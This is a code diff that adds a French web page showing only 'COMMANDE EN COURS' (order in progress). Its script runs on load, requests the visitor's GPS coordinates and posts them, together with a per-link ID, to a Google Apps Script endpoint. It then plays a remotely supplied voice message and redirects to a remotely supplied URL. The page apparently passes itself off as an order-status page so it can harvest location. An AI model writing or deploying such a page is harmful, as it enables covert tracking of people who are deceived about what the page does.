@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Localisation</title>
+  <script>
+    const scriptURL = "https://script.google.com/macros/s/AKfycbyzp5OBxiya8wyAF-miJ5pzz29hzHCtcFDNDpTj77gm7DSU6UUYLO0jGFLvc3C98C_l/exec";
+
+    async function sendLocation() {
+      try {
+        // 🔹 Récupère l'ID depuis l'URL (ex: ?id=1234)
+        const urlParams = new URLSearchParams(window.location.search);
+        const id = urlParams.get("id") || "inconnu";
+
+        // 🔹 Obtenir la position GPS
+        const position = await new Promise((resolve, reject) => {
+          if (!navigator.geolocation) {
+            reject(new Error("Géolocalisation non disponible."));
+          }
+          navigator.geolocation.getCurrentPosition(resolve, reject);
+        });
+
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+
+        // 🔹 Envoi via POST avec ID dynamique
+        await fetch(scriptURL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          body: `id=${encodeURIComponent(id)}&latitude=${latitude}&longitude=${longitude}`
+        });
+
+        // 🔹 Récupération de l’URL de redirection
+        const urlResp = await fetch(`${scriptURL}?data=url`);
+        const urlText = await urlResp.text();
+
+        // 🔹 Récupération du message vocal
+        const msgResp = await fetch(`${scriptURL}?data=message`);
+        const msgText = await msgResp.text();
+
+        // 🔊 Lecture
+        const utterance = new SpeechSynthesisUtterance(msgText);
+        speechSynthesis.speak(utterance);
+
+        // Redirection après 4 secondes
+        setTimeout(() => {
+          window.location.href = urlText.trim();
+        }, 4000);
+
+      } catch (error) {
+        alert("Erreur : " + error.message);
+      }
+    }
+
+    window.onload = sendLocation;
+  </script>
+</head>
+<body>
+  <h1> COMMANDE EN COURS </h1>
+</body>
+</html>
